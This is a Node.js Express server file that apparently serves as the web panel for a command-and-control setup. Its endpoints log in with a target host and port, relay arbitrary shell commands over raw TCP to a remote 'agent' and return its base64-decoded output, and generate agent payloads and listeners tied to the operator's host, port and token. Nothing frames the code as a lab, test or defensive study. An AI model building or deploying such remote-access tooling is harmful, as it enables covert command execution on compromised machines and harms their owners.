import express from 'express';
import cookieParser from 'cookie-parser';
import net from 'node:net';
import crypto from 'node:crypto';
import { createSession, getSession, deleteSession } from './lib/db.js';
import { generateAgent, generateListener } from './lib/payloadGenerator.js';

const app = express();
app.use(express.json());
app.use(cookieParser());
app.set('trust proxy', 1);

function reqUser(req) {
  const sid = req.cookies?.sid;
  return sid ? getSession(sid) : null;
}

function resolveHost(req) {
  const host = req.headers['x-forwarded-host'] || req.headers.host || '127.0.0.1';
  return host.split(':')[0];
}

function runAgentCommand({ host, port, token, command }) {
  return new Promise((resolve, reject) => {
    const socket = net.createConnection({ host, port });
    const timeout = setTimeout(() => {
      socket.destroy();
      reject(new Error('timeout or unreachable'));
    }, 15000);
    let settled = false;
    let buf = '';
    let agentOnline = false;

    socket.setEncoding('utf8');

    socket.once('connect', () => {
      socket.write('PULL\n');
    });

    socket.on('data', (chunk) => {
      buf += chunk;
      let idx;
      while ((idx = buf.indexOf('\n')) >= 0) {
        const line = buf.slice(0, idx).replace(/\r$/, '');
        buf = buf.slice(idx + 1);
        if (!agentOnline && line === 'AGENT ON') {
          agentOnline = true;
          socket.write('CMD ' + command + '\n');
          continue;
        }
        if (line.startsWith('RES ')) {
          try {
            const decoded = Buffer.from(line.slice(4).trim(), 'base64').toString('utf8');
            if (!settled) {
              settled = true;
              clearTimeout(timeout);
              socket.destroy();
              resolve({ ok: true, output: decoded });
            }
          } catch {
            if (!settled) {
              settled = true;
              clearTimeout(timeout);
              socket.destroy();
              resolve({ ok: true, output: line });
            }
          }
          return;
        }
        if (line === 'AGENT ON') continue;
        if (line.startsWith('ERR')) {
          if (!settled) {
            settled = true;
            clearTimeout(timeout);
            socket.destroy();
            reject(new Error(line));
          }
          return;
        }
      }
    });

    socket.on('error', (err) => {
      if (!settled) {
        settled = true;
        clearTimeout(timeout);
        reject(err);
      }
    });

    socket.on('close', () => {
      if (!settled) {
        settled = true;
        clearTimeout(timeout);
        reject(new Error('connection closed'));
      }
    });
  });
}

app.set('json spaces', 2);

app.get('/api/auth/me', (req, res) => {
  const s = reqUser(req);
  if (!s) return res.status(401).json({ error: 'not authenticated' });
  res.json({ port: s.port, host: s.host });
});

app.post('/api/auth/login', (req, res) => {
  const { host, port } = req.body || {};
  const h = String(host || '').trim();
  const p = Number(port);
  if (!h) return res.status(400).json({ error: 'host required' });
  if (!/^[a-zA-Z0-9.\-:\[\]]+$/.test(h)) return res.status(400).json({ error: 'host has invalid characters' });
  if (!Number.isInteger(p) || p <= 0 || p > 65535) {
    return res.status(400).json({ error: 'port invalid' });
  }
  const session = createSession({ port: p, host: h });
  res.cookie('sid', session.id, {
    httpOnly: true,
    sameSite: 'lax',
    secure: req.secure || !!req.headers['x-forwarded-proto']?.includes('https'),
    maxAge: 7 * 24 * 60 * 60 * 1000,
  });
  res.status(200).json({ ok: true, port: session.port, host: session.host });
});

app.post('/api/auth/logout', (req, res) => {
  const sid = req.cookies?.sid;
  if (sid) deleteSession(sid);
  res.clearCookie('sid');
  res.json({ ok: true });
});

app.post('/api/tcp/command', async (req, res) => {
  const s = reqUser(req);
  if (!s) return res.status(401).json({ error: 'not authenticated' });
  const command = String((req.body || {}).command || '').trim();
  if (!command) return res.status(400).json({ error: 'empty command' });
  try {
    const host = s.host || resolveHost(req);
    const result = await runAgentCommand({ host, port: s.port, token: s.agentToken, command });
    res.json(result);
  } catch (err) {
    res.status(502).json({ error: err.message });
  }
});

app.get('/api/tcp/status', (req, res) => {
  const s = reqUser(req);
  if (!s) return res.status(401).json({ error: 'not authenticated' });
  res.json({ port: s.port, host: s.host || resolveHost(req) });
});

app.post('/api/payload/generate', (req, res) => {
  const s = reqUser(req);
  if (!s) return res.status(401).json({ error: 'not authenticated' });
  try {
    const { language = 'python' } = req.body || {};
    const result = generateAgent({ language, host: s.host, port: s.port, token: s.agentToken });
    res.json(result);
  } catch (err) {
    res.status(400).json({ error: err.message });
  }
});

app.post('/api/payload/listener', (req, res) => {
  const s = reqUser(req);
  if (!s) return res.status(401).json({ error: 'not authenticated' });
  try {
    const result = generateListener({ port: s.port, token: s.agentToken });
    res.json(result);
  } catch (err) {
    res.status(400).json({ error: err.message });
  }
});

app.use((req, res) => {
  res.status(404).json({ error: 'not found' });
});

export default app;
